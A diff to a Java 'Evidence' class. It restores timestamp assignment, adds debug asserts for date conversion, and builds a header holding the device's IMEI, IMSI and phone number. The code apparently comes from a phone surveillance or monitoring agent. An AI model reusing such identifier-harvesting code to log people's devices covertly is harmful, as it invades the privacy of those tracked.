@@ -93,7 +93,7 @@ public final class Evidence {
 		device = Device.self();
 
 		progressive = -1;
-		// timestamp = new Date();
+		timestamp = new Date();
 	}
 
 	/**
@@ -322,7 +322,7 @@ public final class Evidence {
 	public byte[] makeDescription(final byte[] additionalData, final int evidenceType) {
 
 		if (timestamp == null) {
-			timestamp = new Date();
+		 timestamp = new Date();
 		}
 
 		int additionalLen = 0;
@@ -331,7 +331,16 @@ public final class Evidence {
 			additionalLen = additionalData.length;
 		}
 
-		final DateTime datetime = new DateTime(timestamp);
+		final DateTime datetime = new DateTime();
+
+		if (Cfg.DEBUG) {
+			final DateTime dt = new DateTime(datetime.getDate());
+			boolean hitest = dt.hiDateTime() == datetime.hiDateTime();
+			boolean lowtest = dt.lowDateTime() == datetime.lowDateTime();
+			Check.log(dt + " ticks: " + dt.getTicks());
+			Check.asserts(hitest, "hi test");
+			Check.asserts(lowtest, "low test");
+		}
 
 		evidenceDescription = new EvidenceDescription();
 		evidenceDescription.version = EVIDENCE_VERSION_01;
@@ -340,7 +349,7 @@ public final class Evidence {
 		evidenceDescription.lTimeStamp = datetime.lowDateTime();
 		evidenceDescription.additionalData = additionalLen;
 		evidenceDescription.deviceIdLen = WChar.getBytes(device.getImei()).length;
-		evidenceDescription.userIdLen = WChar.getBytes(device.getImsi()).length;
+		evidenceDescription.userIdLen   = WChar.getBytes(device.getImsi()).length;
 		evidenceDescription.sourceIdLen = WChar.getBytes(device.getPhoneNumber()).length;
 
 		final byte[] baseHeader = evidenceDescription.getBytes();
